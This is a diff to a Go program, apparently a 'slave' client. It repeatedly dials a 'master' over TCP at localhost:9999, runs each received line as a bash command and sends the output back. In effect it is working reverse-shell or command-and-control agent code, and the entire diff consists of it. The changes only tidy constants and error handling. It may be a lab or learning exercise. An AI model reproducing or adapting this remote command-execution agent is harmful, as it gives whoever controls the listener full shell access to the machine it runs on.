@@ -9,15 +9,17 @@ import (
 	"os/exec"
 	"strings"
 	"time"
-	//	"bytes"
-	//	"os/exec"
 )
 
-const sysShell = "bash"
+const (
+	sysShell  = "bash"
+	addr      = "localhost:9999"
+	tryPeriod = 5
+)
 
 //
 //Execute bash commands...
-func shellOut(command string) (string, error) {
+func shellOut(command string) string {
 	var stdout bytes.Buffer
 	//var stderr bytes.Buffer
 	cmd := exec.Command(sysShell, "-c", command)
@@ -26,8 +28,9 @@ func shellOut(command string) (string, error) {
 	err := cmd.Run()
 	if err != nil {
 		fmt.Println("can't run command", err)
+		return fmt.Sprintf("can't run command: %s", err.Error())
 	}
-	return stdout.String(), err
+	return stdout.String()
 }
 
 func main() {
@@ -36,22 +39,18 @@ func main() {
 		//Starting slave...
 		fmt.Println("starting slave...")
 		//Connecting to master...
-		conn, err := net.Dial("tcp", "localhost:9999")
+		conn, err := net.Dial("tcp", addr)
 		if err != nil {
 			// Wait 5 sec before next try
-			time.Sleep(5 * time.Second)
+			time.Sleep(tryPeriod * time.Second)
 			continue
 		}
-
 		scanner := bufio.NewScanner(conn)
 		//Scanning for commands...
 		for scanner.Scan() {
-			bs := scanner.Bytes()
-			cmd := string(bs)
-
-			resp, _ := shellOut(cmd)
-
-			rr := strings.NewReader("command is done: " + resp + "\r")
+			cmd := scanner.Text()
+			resp := shellOut(cmd)
+			rr := strings.NewReader(resp + "\r")
 			//Returning cmd to master...
 			_, err = io.Copy(conn, rr)
 			if err != nil {
